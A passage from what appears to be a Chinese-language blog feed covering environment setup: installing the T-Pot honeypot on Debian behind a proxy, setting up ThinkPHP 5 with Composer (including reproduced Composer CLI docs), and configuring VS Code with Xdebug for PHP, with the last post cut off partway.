10（Buster）安装步骤</a>，与这篇文章不同的是，由于我之后的安装过程都会通过代理来完成，所以我选择的源为debian官方源。</p><p><strong>注意：</strong>新建用户的用户名不要是tpot，因为tpot服务会自动创建tpot用户。</p><h3 id="切换到root"><a href="#切换到root" class="headerlink" title="切换到root"></a>切换到root</h3><p>debian下切换到root与ubuntu不同</p><div class="hljs code-wrapper"><pre><code class="hljs bash">su -</code></pre></div><h3 id="shell配置代理"><a href="#shell配置代理" class="headerlink" title="shell配置代理"></a>shell配置代理</h3><p>我比较习惯使用如下方式进行代理配置：输入proxy即可打开代理连接，noproxy即可关闭。</p><p>在~/.bashrc中写入：</p><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-function"><span class="hljs-title">proxy</span></span> () &#123;  <span class="hljs-built_in">export</span> http_proxy=<span class="hljs-string">&quot;http://192.168.133.1:10809&quot;</span>  <span class="hljs-built_in">export</span> https_proxy=<span class="hljs-string">&quot;http://192.168.133.1:10809&quot;</span>  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;HTTP Proxy on&quot;</span>&#125;<span class="hljs-comment"># where noproxy</span><span class="hljs-function"><span class="hljs-title">noproxy</span></span> () &#123;  <span class="hljs-built_in">unset</span> http_proxy  <span class="hljs-built_in">unset</span> https_proxy  <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;HTTP Proxy off&quot;</span>&#125;</code></pre></div><p>生效</p><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">source</span> ~/.bashrc</code></pre></div><h3 id="安装net-tools"><a href="#安装net-tools" class="headerlink" title="安装net-tools"></a>安装net-tools</h3><div class="hljs code-wrapper"><pre><code class="hljs bash">apt install net-tools</code></pre></div><h3 id="安装sshd"><a href="#安装sshd" class="headerlink" title="安装sshd"></a>安装sshd</h3><div class="hljs code-wrapper"><pre><code class="hljs bash">apt install openssh-server</code></pre></div><p>安装好后我就可以使用vscode直接连接到这台虚拟机，shell里的复制粘贴方便多了。</p><h3 id="安装docker-io"><a href="#安装docker-io" class="headerlink" title="安装docker.io"></a>安装docker.io</h3><p>为什么要提前安装docker，主要是为了解决安装脚本运行过程中docker镜像拉取过慢的问题。尽管安装脚本install.sh中有配置代理的代码，但是并不会在我们这种方式中自动弹出配置，一种方法是直接修改install.sh，使得在安装docker后自动进行代理配置，另一种方法是提前安装docker并做好配置，不修改源码。这里选择后者。</p><div class="hljs code-wrapper"><pre><code class="hljs bash">apt install docker.io</code></pre></div><p>为什么shell中配置的代理对docker无效，具体可参考：<a href="https://cloud.tencent.com/developer/article/1627708">Linux 系统代理魔法对 Docker 无效？</a></p><blockquote><p><code>Linux</code>所谓的系统代理是针对系统使用者，通过<code>SHELL</code>转化用户请求为系统可识别，完成网络出口的系统转发。<code>Docker</code>基于<code>C/S</code>架构运行，<code>Server</code>端由<code>Systemd</code>维护管理，<code>Client</code>非<code>daemon</code>方式运行，所有请求以<code>API</code>方式，通过<code>SHELL</code>环境，转由<code>Server</code>接收执行命令并返回结果给<code>Client</code>。因此，系统代理魔法对 <code>Docker</code> 无效。换句话讲，凡由非<code>SHELL</code>运行的服务，环境变量均无效。需在进程本身配置代码或其父进程<code>systemd</code>或<code>sysv</code>配置生效。</p></blockquote><p>如果不挂代理，就会出现如下情况</p><div class="hljs code-wrapper"><pre><code class="hljs bash">docker pull hello-worlddocker: Error response from daemon: Get https://registry-1.docker.io/v2/: net/http: request canceled <span class="hljs-keyword">while</span> waiting <span class="hljs-keyword">for</span> connection (Client.Timeout exceeded <span class="hljs-keyword">while</span> awaiting headers).</code></pre></div><h4 id="修改代理"><a href="#修改代理" class="headerlink" title="修改代理"></a>修改代理</h4><p>先修改 <code>/etc/docker/daemon.json</code>，如果没有就创建</p><div class="hljs code-wrapper"><pre><code class="hljs javascript">&#123;  <span class="hljs-string">&quot;registry-mirrors&quot;</span>:[<span class="hljs-string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>]&#125;</code></pre></div><p>再创建<code>/etc/systemd/system/docker.service.d/http-proxy.conf</code>写入如下内容，这一步是给docker加代理</p><div class="hljs code-wrapper"><pre><code class="hljs bash">[Service]Environment=http_proxy=http://proxyip:proxyport</code></pre></div><p>运行</p><div class="hljs code-wrapper"><pre><code class="hljs bash">systemctl daemon-reloadsystemctl restart docker</code></pre></div><h3 id="开始安装T-pot"><a href="#开始安装T-pot" class="headerlink" title="开始安装T-pot"></a>开始安装T-pot</h3><div class="hljs code-wrapper"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/telekom-security/tpotce.git<span class="hljs-built_in">cd</span> tpotce/iso/installer/./install.sh --<span class="hljs-built_in">type</span>=user</code></pre></div><p>按照正常的流程走即可</p><p>安装过程中可以会出现一些报错信息，如</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210122164921914.png" alt="image-20210122164921914"></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210123092336899.png" alt="image-20210123092336899"></p><p>不用管即可，安装完成之后会自动重启。</p><p>重启后可能出现</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210123163725531.png" alt="image-20210123163725531"></p><p>这应该是正常现象，一小段时间后系统就正常启动了</p><p>重启之后运行</p><div class="hljs code-wrapper"><pre><code class="hljs bash">systemctl start tpot</code></pre></div><p>T-pot中Kinana的访问使用nginx进行了转发。所以我们得访问nginx监听的64297端口。使用https访问并输入安装时设置的用户名密码就可以进入T-pot页面。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210123154925156.png" alt="image-20210123154925156"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a href="https://cyber-99.co.uk/t-pot-honeypot-framework-installation">T-Pot Honeypot Framework Installation</a></li><li><a href="https://www.freebuf.com/geek/260342.html">T-POT蜜罐(20.06)在VPS上安装与使用教程(原创)</a></li><li><a href="https://blog.csdn.net/KoalaZB/article/details/109337255">企业部署T-Pot(20.06)蜜罐系统并使用</a></li><li><a href="https://zhuanlan.zhihu.com/p/73122221">图解 Debian 10（Buster）安装步骤</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
      <category>honeypot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>T-pot</tag>
      
      <tag>代理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Composer 快速搭建thinkphp环境</title>
    <link href="/2021/01/08/Composer-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAthinkphp%E7%8E%AF%E5%A2%83/"/>
    <url>/2021/01/08/Composer-%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BAthinkphp%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<h1 id="Composer-快速搭建thinkphp环境"><a href="#Composer-快速搭建thinkphp环境" class="headerlink" title="Composer 快速搭建thinkphp环境"></a>Composer 快速搭建thinkphp环境</h1><p>具体的操作流程可以参考：<a href="http://www.thinkphp.cn/topic/52362.html">史上最详细的Composer安装tp5教程</a></p><h2 id="Composer简介"><a href="#Composer简介" class="headerlink" title="Composer简介"></a>Composer简介</h2><blockquote><p>Composer 不是一个包管理器。是的，它涉及 “packages” 和 “libraries”，但它在每个项目的基础上进行管理，在你项目的某个目录中（例如 <code>vendor</code>）进行安装。默认情况下它不会在全局安装任何东西。因此，这仅仅是一个依赖管理。</p><p>这种想法并不新鲜，Composer 受到了 node’s <a href="http://npmjs.org/">npm</a> 和 ruby’s <a href="http://gembundler.com/">bundler</a> 的强烈启发。而当时 PHP 下并没有类似的工具。</p><p>Composer 将这样为你解决问题：</p><p>a) 你有一个项目依赖于若干个库。</p><p>b) 其中一些库依赖于其他库。</p><p>c) 你声明你所依赖的东西。</p><p>d) Composer 会找出哪个版本的包需要安装，并安装它们（将它们下载到你的项目中）。</p></blockquote><p>你所需要做的就是创建一个 <code>composer.json</code> 文件，其中描述了项目的依赖关系。</p><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;    <span class="hljs-attr">&quot;require&quot;</span>: &#123;        <span class="hljs-attr">&quot;monolog/monolog&quot;</span>: <span class="hljs-string">&quot;1.2.*&quot;</span>    &#125;&#125;</code></pre></div><h2 id="Composer安装"><a href="#Composer安装" class="headerlink" title="Composer安装"></a>Composer安装</h2><p>参考Composer中文网的<a href="https://docs.phpcomposer.com/00-intro.html">中文文档</a></p><h2 id="Composer配置中国镜像"><a href="#Composer配置中国镜像" class="headerlink" title="Composer配置中国镜像"></a>Composer配置中国镜像</h2><blockquote><p>有两种方式启用本镜像服务：</p><ul><li><strong>系统全局配置：</strong> 即将配置信息添加到 Composer 的全局配置文件 <code>config.json</code> 中。见<a href="https://pkg.phpcomposer.com/#tip1">“方法一”</a></li><li><strong>单个项目配置：</strong> 将配置信息添加到某个项目的 <code>composer.json</code> 文件中。见<a href="https://pkg.phpcomposer.com/#tip2">“方法二”</a></li></ul><h3 id="方法一：-修改-composer-的全局配置文件（推荐方式）"><a href="#方法一：-修改-composer-的全局配置文件（推荐方式）" class="headerlink" title="方法一： 修改 composer 的全局配置文件（推荐方式）"></a><strong>方法一：</strong> 修改 composer 的全局配置文件<strong>（推荐方式）</strong></h3><p>打开命令行窗口（windows用户）或控制台（Linux、Mac 用户）并执行如下命令：</p><p>复制</p><div class="hljs code-wrapper"><pre><code class="hljs bash">composer config -g repo.packagist composer https://packagist.phpcomposer.com</code></pre></div><h3 id="方法二：-修改当前项目的-composer-json-配置文件："><a href="#方法二：-修改当前项目的-composer-json-配置文件：" class="headerlink" title="方法二： 修改当前项目的 composer.json 配置文件："></a><strong>方法二：</strong> 修改当前项目的 <code>composer.json</code> 配置文件：</h3><p>打开命令行窗口（windows用户）或控制台（Linux、Mac 用户），进入你的项目的根目录（也就是 <code>composer.json</code> 文件所在目录），执行如下命令：</p><p>复制</p><div class="hljs code-wrapper"><pre><code class="hljs bash">composer config repo.packagist composer https://packagist.phpcomposer.com</code></pre></div><p>上述命令将会在当前项目中的 <code>composer.json</code> 文件的末尾自动添加镜像的配置信息（你也可以自己手工添加）：</p><p>复制</p><div class="hljs code-wrapper"><pre><code class="hljs json">&quot;repositories&quot;: &#123;    &quot;packagist&quot;: &#123;        &quot;type&quot;: &quot;composer&quot;,        &quot;url&quot;: &quot;https://packagist.phpcomposer.com&quot;    &#125;&#125;</code></pre></div></blockquote><h2 id="Composer使用"><a href="#Composer使用" class="headerlink" title="Composer使用"></a>Composer使用</h2><h3 id="命令行"><a href="#命令行" class="headerlink" title="命令行"></a>命令行</h3><p>转载于：<a href="https://docs.phpcomposer.com/03-cli.html">https://docs.phpcomposer.com/03-cli.html</a></p><div class="hljs code-wrapper"><pre><code class="hljs sh">   ______  / ____/___  ____ ___  ____  ____  ________  _____ / /   / __ \/ __ `__ \/ __ \/ __ \/ ___/ _ \/ ___// /___/ /_/ / / / / / / /_/ / /_/ (__  )  __/ /\____/\____/_/ /_/ /_/ .___/\____/____/\___/_/                    /_/Composer version 1.9.0 2019-08-02 20:55:32Usage:  <span class="hljs-built_in">command</span> [options] [arguments]Options:  -h, --<span class="hljs-built_in">help</span>                     Display this <span class="hljs-built_in">help</span> message  -q, --quiet                    Do not output any message  -V, --version                  Display this application version      --ansi                     Force ANSI output      --no-ansi                  Disable ANSI output  -n, --no-interaction           Do not ask any interactive question      --profile                  Display timing and memory usage information      --no-plugins               Whether to <span class="hljs-built_in">disable</span> plugins.  -d, --working-dir=WORKING-DIR  If specified, use the given directory as working directory.      --no-cache                 Prevent use of the cache  -v|vv|vvv, --verbose           Increase the verbosity of messages: 1 <span class="hljs-keyword">for</span> normal output, 2 <span class="hljs-keyword">for</span> more verbose output and 3 <span class="hljs-keyword">for</span> debugAvailable commands:  about                Shows the short information about Composer.  archive              Creates an archive of this composer package.  browse               Opens the package<span class="hljs-string">&#x27;s repository URL or homepage in your browser.</span><span class="hljs-string">  check-platform-reqs  Check that platform requirements are satisfied.</span><span class="hljs-string">  clear-cache          Clears composer&#x27;</span>s internal package cache.  clearcache           Clears composer<span class="hljs-string">&#x27;s internal package cache.</span><span class="hljs-string">  config               Sets config options.</span><span class="hljs-string">  create-project       Creates new project from a package into given directory.</span><span class="hljs-string">  depends              Shows which packages cause the given package to be installed.</span><span class="hljs-string">  diagnose             Diagnoses the system to identify common errors.</span><span class="hljs-string">  dump-autoload        Dumps the autoloader.</span><span class="hljs-string">  dumpautoload         Dumps the autoloader.</span><span class="hljs-string">  exec                 Executes a vendored binary/script.</span><span class="hljs-string">  global               Allows running commands in the global composer dir ($COMPOSER_HOME).</span><span class="hljs-string">  help                 Displays help for a command</span><span class="hljs-string">  home                 Opens the package&#x27;</span>s repository URL or homepage <span class="hljs-keyword">in</span> your browser.  i                    Installs the project dependencies from the composer.lock file <span class="hljs-keyword">if</span> present, or falls back on the composer.json.  info                 Shows information about packages.  init                 Creates a basic composer.json file <span class="hljs-keyword">in</span> current directory.  install              Installs the project dependencies from the composer.lock file <span class="hljs-keyword">if</span> present, or falls back on the composer.json.  licenses             Shows information about licenses of dependencies.  list                 Lists commands  outdated             Shows a list of installed packages that have updates available, including their latest version.  prohibits            Shows <span class="hljs-built_in">which</span> packages prevent the given package from being installed.  remove               Removes a package from the require or require-dev.  require              Adds required packages to your composer.json and installs them.  run                  Runs the scripts defined <span class="hljs-keyword">in</span> composer.json.  run-script           Runs the scripts defined <span class="hljs-keyword">in</span> composer.json.  search               Searches <span class="hljs-keyword">for</span> packages.  self-update          Updates composer.phar to the latest version.  selfupdate           Updates composer.phar to the latest version.  show                 Shows information about packages.  status               Shows a list of locally modified packages, <span class="hljs-keyword">for</span> packages installed from <span class="hljs-built_in">source</span>.  suggests             Shows package suggestions.  u                    Upgrades your dependencies to the latest version according to composer.json, and updates the composer.lock file.  update               Upgrades your dependencies to the latest version according to composer.json, and updates the composer.lock file.  upgrade              Upgrades your dependencies to the latest version according to composer.json, and updates the composer.lock file.  validate             Validates a composer.json and composer.lock.  why                  Shows <span class="hljs-built_in">which</span> packages cause the given package to be installed.  why-not              Shows <span class="hljs-built_in">which</span> packages prevent the given package from being installed.</code></pre></div><h4 id="搜索-search"><a href="#搜索-search" class="headerlink" title="搜索 search"></a>搜索 <code>search</code></h4><p><code>search</code> 命令允许你为当前项目搜索依赖包，通常它只搜索 packagist.org 上的包，你可以简单的输入你的搜索条件。</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar search monolog</code></pre></div><p>您也可以通过传递多个参数来进行多条件搜索。</p><h4 id="搜索-参数"><a href="#搜索-参数" class="headerlink" title="搜索-参数"></a>搜索-参数</h4><ul><li><strong>–only-name (-N):</strong> 仅针对指定的名称搜索（完全匹配）。</li></ul><h4 id="展示-show"><a href="#展示-show" class="headerlink" title="展示 show"></a>展示 <code>show</code></h4><p>列出所有可用的软件包，你可以使用 <code>show</code> 命令。</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar show</code></pre></div><p>如果你想看到一个包的详细信息，你可以输入一个包名称。</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar show monolog/monologname     : monolog/monologversions : master-dev, 1.0.2, 1.0.1, 1.0.0, 1.0.0-RC1<span class="hljs-built_in">type</span>     : librarynames    : monolog/monolog<span class="hljs-built_in">source</span>   : [git] http://github.com/Seldaek/monolog.git 3d4e60d0cbc4b888fe5ad223d77964428b1978dadist     : [zip] http://github.com/Seldaek/monolog/zipball/3d4e60d0cbc4b888fe5ad223d77964428b1978da 3d4e60d0cbc4b888fe5ad223d77964428b1978dalicense  : MIT<span class="hljs-built_in">autoload</span>psr-0Monolog : src/requiresphp &gt;=5.3.0</code></pre></div><p>你甚至可以输入一个软件包的版本号，来显示该版本的详细信息。</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar show monolog/monolog 1.0.2</code></pre></div><h4 id="展示-参数"><a href="#展示-参数" class="headerlink" title="展示-参数"></a>展示-参数</h4><ul><li><strong>–installed (-i):</strong> 列出已安装的依赖包。</li><li><strong>–platform (-p):</strong> 仅列出平台软件包（PHP 与它的扩展）。</li><li><strong>–self (-s):</strong> 仅列出当前项目信息。</li></ul><h4 id="初始化-init"><a href="#初始化-init" class="headerlink" title="初始化 init"></a>初始化 <code>init</code></h4><p>在 <a href="https://docs.phpcomposer.com/02-libraries.html">“库”</a> 那一章我们看到了如何手动创建 <code>composer.json</code> 文件。实际上还有一个 <code>init</code> 命令可以更容易的做到这一点。</p><p>当您运行该命令，它会以交互方式要求您填写一些信息，同时聪明的使用一些默认值。</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar init</code></pre></div><p>不过通过这样的方式交互式填写会比较繁琐。</p><h4 id="初始化-参数"><a href="#初始化-参数" class="headerlink" title="初始化-参数"></a>初始化-参数</h4><ul><li><strong>–name:</strong> 包的名称。</li><li><strong>–description:</strong> 包的描述。</li><li><strong>–author:</strong> 包的作者。</li><li><strong>–homepage:</strong> 包的主页。</li><li><strong>–require:</strong> 需要依赖的其它包，必须要有一个版本约束。并且应该遵循 <code>foo/bar:1.0.0</code> 这样的格式。</li><li><strong>–require-dev:</strong> 开发版的依赖包，内容格式与 <strong>–require</strong> 相同。</li><li><strong>–stability (-s):</strong> <code>minimum-stability</code> 字段的值。</li></ul><h4 id="更新-update"><a href="#更新-update" class="headerlink" title="更新 update"></a>更新 <code>update</code></h4><p>为了获取依赖的最新版本，并且升级 <code>composer.lock</code> 文件，你应该使用 <code>update</code> 命令。</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar update</code></pre></div><p>这将解决项目的所有依赖，并将确切的版本号写入 <code>composer.lock</code>。</p><p>如果你只是想更新几个包，你可以像这样分别列出它们：</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar update vendor/package vendor/package2</code></pre></div><p>你还可以使用通配符进行批量更新：</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar update vendor/*</code></pre></div><h4 id="更新-参数"><a href="#更新-参数" class="headerlink" title="更新-参数"></a>更新-参数</h4><ul><li><strong>–prefer-source:</strong> 当有可用的包时，从 <code>source</code> 安装。</li><li><strong>–prefer-dist:</strong> 当有可用的包时，从 <code>dist</code> 安装。</li><li><strong>–dry-run:</strong> 模拟命令，并没有做实际的操作。</li><li><strong>–dev:</strong> 安装 <code>require-dev</code> 字段中列出的包（这是一个默认值）。</li><li><strong>–no-dev:</strong> 跳过 <code>require-dev</code> 字段中列出的包。</li><li><strong>–no-scripts:</strong> 跳过 <code>composer.json</code> 文件中定义的脚本。</li><li><strong>–no-plugins:</strong> 关闭 plugins。</li><li><strong>–no-progress:</strong> 移除进度信息，这可以避免一些不处理换行的终端或脚本出现混乱的显示。</li><li><strong>–optimize-autoloader (-o):</strong> 转换 PSR-0/4 autoloading 到 classmap 可以获得更快的加载支持。特别是在生产环境下建议这么做，但由于运行需要一些时间，因此并没有作为默认值。</li><li><strong>–lock:</strong> 仅更新 lock 文件的 hash，取消有关 lock 文件过时的警告。</li><li><strong>–with-dependencies</strong> 同时更新白名单内包的依赖关系，这将进行递归更新。</li></ul><h4 id="自我更新-self-update"><a href="#自我更新-self-update" class="headerlink" title="自我更新 self-update"></a>自我更新 <code>self-update</code></h4><p>将 Composer 自身升级到最新版本，只需要运行 <code>self-update</code> 命令。它将替换你的 <code>composer.phar</code> 文件到最新版本。</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar self-update</code></pre></div><p>如果你想要升级到一个特定的版本，可以这样简单的指定它：</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar self-update 1.0.0-alpha7</code></pre></div><p>如果你已经为整个系统安装 Composer（参见 <a href="https://docs.phpcomposer.com/00-intro.html#%E5%85%A8%E5%B1%80%E5%AE%89%E8%A3%85">全局安装</a>），你可能需要在 <code>root</code> 权限下运行它：</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sudo composer self-update</code></pre></div><h4 id="自我更新-参数"><a href="#自我更新-参数" class="headerlink" title="自我更新-参数"></a>自我更新-参数</h4><ul><li><strong>–rollback (-r):</strong> 回滚到你已经安装的最后一个版本。</li><li><strong>–clean-backups:</strong> 在更新过程中删除旧的备份，这使得更新过后的当前版本是唯一可用的备份。</li></ul><h4 id="创建项目-create-project"><a href="#创建项目-create-project" class="headerlink" title="创建项目 create-project"></a>创建项目 <code>create-project</code></h4><p>你可以使用 Composer 从现有的包中创建一个新的项目。这相当于执行了一个 <code>git clone</code> 或 <code>svn checkout</code> 命令后将这个包的依赖安装到它自己的 vendor 目录。</p><p>此命令有几个常见的用途：</p><ol><li>你可以快速的部署你的应用。</li><li>你可以检出任何资源包，并开发它的补丁。</li><li>多人开发项目，可以用它来加快应用的初始化。</li></ol><p>要创建基于 Composer 的新项目，你可以使用 “create-project” 命令。传递一个包名，它会为你创建项目的目录。你也可以在第三个参数中指定版本号，否则将获取最新的版本。</p><p>如果该目录目前不存在，则会在安装过程中自动创建。</p><div class="hljs code-wrapper"><pre><code class="hljs sh">php composer.phar create-project doctrine/orm path 2.2.*</code></pre></div><p>此外，你也可以无需使用这个命令，而是通过现有的 <code>composer.json</code> 文件来启动这个项目。</p><p>默认情况下，这个命令会在 packagist.org 上查找你指定的包。</p><h4 id="创建项目-参数"><a href="#创建项目-参数" class="headerlink" title="创建项目-参数"></a>创建项目-参数</h4><ul><li><strong>–repository-url:</strong> 提供一个自定义的储存库来搜索包，这将被用来代替 packagist.org。可以是一个指向 <code>composer</code> 资源库的 HTTP URL，或者是指向某个 <code>packages.json</code> 文件的本地路径。</li><li><strong>–stability (-s):</strong> 资源包的最低稳定版本，默认为 <code>stable</code>。</li><li><strong>–prefer-source:</strong> 当有可用的包时，从 <code>source</code> 安装。</li><li><strong>–prefer-dist:</strong> 当有可用的包时，从 <code>dist</code> 安装。</li><li><strong>–dev:</strong> 安装 <code>require-dev</code> 字段中列出的包。</li><li><strong>–no-install:</strong> 禁止安装包的依赖。</li><li><strong>–no-plugins:</strong> 禁用 plugins。</li><li><strong>–no-scripts:</strong> 禁止在根资源包中定义的脚本执行。</li><li><strong>–no-progress:</strong> 移除进度信息，这可以避免一些不处理换行的终端或脚本出现混乱的显示。</li><li><strong>–keep-vcs:</strong> 创建时跳过缺失的 VCS 。如果你在非交互模式下运行创建命令，这将是非常有用的。</li></ul><h3 id="composer-json语法"><a href="#composer-json语法" class="headerlink" title="composer.json语法"></a>composer.json语法</h3><p>具体可参考：<a href="https://getcomposer.org/doc/04-schema.md">The composer.json schema</a></p><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;    <span class="hljs-attr">&quot;$schema&quot;</span>: <span class="hljs-string">&quot;https://json-schema.org/draft-04/schema#&quot;</span>,    <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Package&quot;</span>,    <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;object&quot;</span>,    <span class="hljs-attr">&quot;additionalProperties&quot;</span>: <span class="hljs-literal">false</span>,    <span class="hljs-attr">&quot;required&quot;</span>: [ <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;description&quot;</span> ],    <span class="hljs-attr">&quot;properties&quot;</span>: &#123;    <span class="hljs-attr">&quot;name&quot;</span>: &#123;...        &#125;,    &quot;description&quot;: &#123;...        &#125;,    &quot;version&quot;: &#123;...        &#125;,    &quot;type&quot;: &#123;...        &#125;,    &quot;keywords&quot;: &#123;...        &#125;,    &quot;homepage&quot;: &#123;...        &#125;,    &quot;readme&quot;: &#123;...        &#125;,    &quot;time&quot;: &#123;...        &#125;,    &quot;license&quot;: &#123;...        &#125;,    &quot;authors&quot;: &#123;...        &#125;,    &quot;support&quot;: &#123;...        &#125;,    &quot;funding&quot;: &#123;...        &#125;,    &#125;&#125;</code></pre></div><p>下面是一份thinkphp的</p><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;    <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;topthink/think&quot;</span>,    <span class="hljs-attr">&quot;description&quot;</span>: <span class="hljs-string">&quot;the new thinkphp framework&quot;</span>,    <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;project&quot;</span>,    <span class="hljs-attr">&quot;keywords&quot;</span>: [        <span class="hljs-string">&quot;framework&quot;</span>,        <span class="hljs-string">&quot;thinkphp&quot;</span>,        <span class="hljs-string">&quot;ORM&quot;</span>    ],    <span class="hljs-attr">&quot;homepage&quot;</span>: <span class="hljs-string">&quot;http://thinkphp.cn/&quot;</span>,    <span class="hljs-attr">&quot;license&quot;</span>: <span class="hljs-string">&quot;Apache-2.0&quot;</span>,    <span class="hljs-attr">&quot;authors&quot;</span>: [        &#123;            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;liu21st&quot;</span>,            <span class="hljs-attr">&quot;email&quot;</span>: <span class="hljs-string">&quot;liu21st@gmail.com&quot;</span>        &#125;    ],    <span class="hljs-attr">&quot;require&quot;</span>: &#123;        <span class="hljs-attr">&quot;php&quot;</span>: <span class="hljs-string">&quot;&gt;=5.4.0&quot;</span>,        <span class="hljs-attr">&quot;topthink/framework&quot;</span>: <span class="hljs-string">&quot;5.0.*&quot;</span>    &#125;,    <span class="hljs-attr">&quot;autoload&quot;</span>: &#123;        <span class="hljs-attr">&quot;psr-4&quot;</span>: &#123;            <span class="hljs-attr">&quot;app\\&quot;</span>: <span class="hljs-string">&quot;application&quot;</span>        &#125;    &#125;,    <span class="hljs-attr">&quot;extra&quot;</span>: &#123;        <span class="hljs-attr">&quot;think-path&quot;</span>: <span class="hljs-string">&quot;thinkphp&quot;</span>    &#125;,    <span class="hljs-attr">&quot;config&quot;</span>: &#123;        <span class="hljs-attr">&quot;preferred-install&quot;</span>: <span class="hljs-string">&quot;dist&quot;</span>    &#125;&#125;</code></pre></div><h3 id="vscode-composer插件"><a href="#vscode-composer插件" class="headerlink" title="vscode composer插件"></a>vscode composer插件</h3><p>此插件为PHP的Composer依赖关系管理器提供了一个接口。 它还为composer.json配置文件提供语法验证。</p><h2 id="Composer搭建Thinkphp5"><a href="#Composer搭建Thinkphp5" class="headerlink" title="Composer搭建Thinkphp5"></a>Composer搭建Thinkphp5</h2><p>切换到你的web根目录下面并执行下面的命令：</p><div class="hljs code-wrapper"><pre><code class="hljs sh">composer create-project topthink/think=5.0.* tp5  --prefer-dist</code></pre></div><p>访问：</p><p><a href="http://localhost/tp5/public/">http://localhost/tp5/public/</a></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="https://docs.phpcomposer.com/">Composer中文文档</a></li><li><a href="http://www.thinkphp.cn/topic/52362.html">史上最详细的Composer安装tp5教程</a></li><li><a href="https://www.kancloud.cn/manual/thinkphp5">ThinkPHP5.0完全开发手册</a></li><li><a href="https://getcomposer.org/doc/04-schema.md">The composer.json schema</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>环境搭建</category>
      
      <category>thinkphp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>thinkphp</tag>
      
      <tag>composer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Vs Code PHP调试环境配置</title>
    <link href="/2021/01/07/Vs-Code-PHP%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <url>/2021/01/07/Vs-Code-PHP%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="Vs-Code配置PHP开发环境-xdebug调试"><a href="#Vs-Code配置PHP开发环境-xdebug调试" class="headerlink" title="Vs Code配置PHP开发环境+xdebug调试"></a>Vs Code配置PHP开发环境+xdebug调试</h1><h2 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h2><p><strong>PHP Intelephense</strong></p><p>PHP 的代码提示、补全、跳转定义、格式化插件，功能强大，无需配置</p><p><strong>PHP DocBlocker</strong></p><p>注释自动生成器，/** 回车</p><p><strong>PHP Namespace Resolver</strong></p><p>PHP 命名空间解析器；可以导入和扩展类；还可以排序。</p><p><strong>PHP debug</strong></p><h2 id="配置Vs-code"><a href="#配置Vs-code" class="headerlink" title="配置Vs code"></a>配置Vs code</h2><p>快捷键Ctrl+Shift+P,输入setting,打开设置</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190112183058279.png" alt="img"></p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190112183129939.png" alt="img"></p><p>配置PHP可执行文件路径，linux下也是一样。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190112183225969.png" alt="img"></p><p>设置完毕后,来到调试界面,首次调试的时候需要点击齿轮按钮自动生成运行方案,默认的配置就行</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20190112183439787.png" alt="img"></p><h2 id="php-xdebug-安装"><a href="#php-xdebug-安装" class="headerlink" title="php-xdebug 安装"></a>php-xdebug 安装</h2><p>php需要安装xdebug扩展，根据自己的php版本来选即可</p><div class="hljs code-wrapper"><pre><code class="hljs bash">apt-cache search php | grep xdebugphp -v</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20210107152716532.png" alt="image-20210107152716532"></p><h2 id="php配置修改"><a href="#php配置修改" class="headerlink" title="php配置修改"></a>php配置修改</h2><p>安装好xdebug扩展后，还需要修改配置文件</p><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /etc/php/7.4/apache2/conf.dll</code></pre></div><p><img 